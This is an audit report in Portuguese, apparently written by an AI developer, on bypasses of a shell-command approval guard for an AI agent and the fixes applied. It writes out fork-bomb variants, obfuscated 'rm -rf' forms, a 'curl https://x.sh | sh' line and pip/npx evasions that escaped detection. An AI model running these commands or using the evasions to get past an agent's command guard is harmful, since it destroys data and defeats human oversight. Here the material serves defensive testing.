# Hermes OmniRoute Studio — Achados R3

**Data:** 2026-08-22
**Autor:** Claude (desenvolvedor master do projeto)
**Método:** execução do parser real (`tools.approval`) no container, não leitura de código.
**Baseline de regressão:** mesma suíte rodada antes e depois da mudança, com exit code capturado.

---

## 0. Primeiro: o que já estava corrigido

Antes de escrever uma linha, reverifiquei os cinco itens abertos da rodada R2 contra o
código **atual**. Cinco dos oito já estavam resolvidos:

| Achado R2 | Status real hoje | Evidência |
|---|---|---|
| R2-NEW-02 `smart_policy` contradiz o guard | ✅ CORRIGIDO | `omniroute-preset.ts` agora diz *"lockfile-based dependency restores"* e *"Always require explicit approval when a command names a new package or package version"* |
| R2-NEW-04 extensões executáveis | ✅ CORRIGIDO | `security-boundaries.ts` cobre `.hta .wsf .wsh .jse .vbe .reg .url .scf .pif .cpl .msc .msp .appref-ms .ps2 .psc1 .chm .sct .inf` |
| R2-NEW-05 promoção de raiz de drive | ✅ CORRIGIDO | `isUnsafeBroadFsRoot()` existe e é chamado em `approveNativeSelectedPath` (`main.ts:788-802`); seleção de arquivo virou permissão **por arquivo** |
| R2-NEW-06 `frame-src http:` | ✅ CORRIGIDO | `content-security.ts` não tem mais `http:` global; usa `http://127.0.0.1:* http://localhost:*` |
| R2-NEW-07 fail-open no `tool_executor` | ✅ CORRIGIDO | `agent/tool_executor.py:650-661` devolve `BLOCKED: the pre-tool security policy could not be evaluated` |
| R2-NEW-08 `uv pip` / `poetry` / `pdm` / `conda` | ✅ CORRIGIDO | `DANGEROUS_PATTERNS` ganhou `uv pip install`, `uv add`, `poetry add`, `pdm add`, `conda install` |

Prova executada (parser real, 15 comandos que **devem** disparar, 14 que **não** devem):

```
MUST_FLAG : 15/15
MUST_NOT  : 14/14 limpos
```

**Não reabri nenhuma dessas decisões.** O que segue são achados **novos**, encontrados
rodando o parser contra um corpus maior.

---

## R3-01 · P1 · Executores remotos de pacote não eram detectados

```text
ARQUIVO  tools/approval.py — DANGEROUS_PATTERNS
```

`npx`, `bunx`, `uvx`, `pnpm dlx`, `yarn dlx`, `npm exec` e `pipx run` **baixam um
pacote de um registro público e o executam em um único passo**, sem lockfile e sem
registro de instalação. Nenhum era detectado:

```
pass npx cowsay hi
pass npx -y some-pkg
pass pnpm dlx create-app
pass yarn dlx foo
pass bunx cowsay
pass uvx ruff
pass pipx run cowsay
pass pipx install black
```

Enquanto isso, no mesmo módulo:

```
FLAG curl https://x.sh | sh   -> pipe remote content to shell
```

É a mesma operação — buscar código de um servidor remoto e executá-lo — tratada de
dois jeitos opostos. O prompt do próprio npm (*"Ok to proceed?"*) não salva: com stdin
fora de um TTY, que é **toda** invocação feita por um agente, o npm segue sozinho.

**Corrigido.** Detector baseado em tokens, reaproveitando a segmentação e a
desofuscação que o módulo já usa (`_iter_top_level_shell_segments`,
`_iter_shell_command_word_spans`, `_deobfuscate_shell_word_for_detection`), portanto
herda a resistência a `r\m`-style tricks. As formas garantidamente locais
(`npx --no-install`, `npx --no`) continuam silenciosas.

---

## R3-02 · P1 · `--target` escondia o pacote de uma regra que já existia

```text
ARQUIVO  tools/approval.py — padrão de pip install
```

Evasão medida:

```
pass pip install --target . requests
pass pip install -t ./vendor requests
pass uv pip install --target . requests
```

Causa: o grupo de opções do regex (`(?:\s+--?[a-z][\w-]*(?:=\S+)?)*`) consome
`--target`, mas **não consome o valor da opção quando ele é um token separado**. O
próximo token vira `.`, o lookahead do pacote `(?!-|\.)` rejeita, e a regra inteira
não casa. `requests` nunca é visto por ninguém.

Não é teórico: `pip install --target . requests` instala no diretório atual e é uma
linha que qualquer agente escreveria sozinho.

**Corrigido** pelo mesmo caminhamento de tokens, que pula o valor da opção
corretamente. Regras de restauração (`-r`, `--requirement`, `--frozen`) e instalação
local (`pip install -e .`, `pip install .`) continuam silenciosas.

---

## R3-03 · P2 · A regra de fork bomb cobria uma única grafia

```text
ARQUIVO  tools/approval.py — HARDLINE_PATTERNS
PADRÃO   r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:'
```

O padrão exige literalmente `:()` colado. Uma fork bomb é apenas uma função que se
canaliza para si mesma em background — o nome `:` é decoração. Escapes medidos contra
`detect_hardline_command`, todos retornando **PASS**:

```
HARDLINE   :(){ :|:& };:
PASS       : (){ :|:& };:                  <- um espaço
PASS       bomb(){ bomb|bomb& };bomb       <- qualquer outro nome
PASS       forkbomb() { forkbomb | forkbomb & }; forkbomb
PASS       f(){ f|f& };f
```

Isso é um furo no **piso hardline** — a camada que não deveria depender de aprovação
nenhuma.

**Corrigido** com uma regra que casa a *forma* por retrorreferência: mesmo
identificador definido, canalizado para si mesmo, em background. A regra literal
antiga foi mantida ao lado, por defesa em profundidade.

Prova:
```
fork bombs bloqueadas:    8/8
funções benignas limpas:  7/7
```
As benignas incluem `run(){ tail -f log | grep err & }` e `x(){ y|z& }` — pipe
em background, nomes diferentes, corretamente ignoradas.

---

## R3-04 · P3 · Falso positivo pré-existente (deixado de propósito)

```
True | echo 'pip install requests' > notes.txt
True | # pip install requests
```

As regras de supply-chain não são ancoradas em posição de comando, então o texto
`pip install X` dentro de um `echo` ou de um comentário dispara aprovação. **Não
corrigi**, e a decisão é deliberada:

**DECISÃO ASSUMIDA:** manter. Sobre-aprovar é a direção segura. Reancorar essas regras
em posição de comando é uma mudança com risco de criar *bypass* e precisa da sua
própria rodada de testes; trocar um prompt extra por um possível furo seria um mau
negócio. Confirmado como pré-existente rodando o mesmo caso contra a cópia intocada
do arquivo.

---

## R3-05 · Escopo declarado: gerenciadores de pacote do SO ficam de fora

`apt`, `apt-get`, `dnf`, `yum`, `zypper`, `apk`, `brew`, `choco`, `winget`, `scoop`,
`snap` **não** foram adicionados.

Eu havia incluído; o teste
`tests/tools/test_approval.py::TestDetectSudoStdin::test_interactive_or_unrelated_sudo_safe`
falhou em `apt install sudo`. O teste está certo e eu estava errado: este guard existe
para mutação do **grafo de dependências do projeto**, onde os lifecycle hooks de um
pacote rodam como o agente no próximo build. Instalação de pacote do SO é outra decisão
de confiança, já coberta pelas regras de sudo/root, e dobrar as duas faria a regra
disparar em setup de ambiente comum.

A exclusão está agora **asserida em teste** (`test_os_package_managers_remain_out_of_scope`),
para que uma edição futura tenha que discutir com ela em vez de mudar por descuido.

---

## Verificação

Suíte rodada **antes e depois**, mesmos arquivos, exit code capturado:

```
BASELINE (arquivo intocado):  4 failed, 233 passed
DEPOIS   (com a correção):    4 failed, 304 passed
```

Mesmo conjunto de 4 falhas nos dois lados — todas de ambiente (`prompt_toolkit`
ausente, fixtures perdidas por `--noconftest`). **Zero regressões.** Os 71 testes
extras são os novos.

Arquivo de teste novo isolado:
```
tests/tools/test_package_fetch_guard.py .......... 86 passed   exit 0
```

Corpus destrutivo de regressão do guardrail, no caminho real:
```
destrutivos bloqueados: 18/18   (r\m -rf, r''m -rf, $(rm -rf), backtick incluídos)
```

Diff aplicado: `tools/approval.py` **+232 / -2**.

---

## O que NÃO foi verificado

`npm run typecheck`, `npm run lint` e a suíte Electron não foram executados nesta
rodada — não há toolchain Windows/Electron neste container. A mudança é 100% Python e
não toca nenhum arquivo TypeScript, então o risco para essas suítes é nulo, mas o fato
fica registrado em vez de assumido.
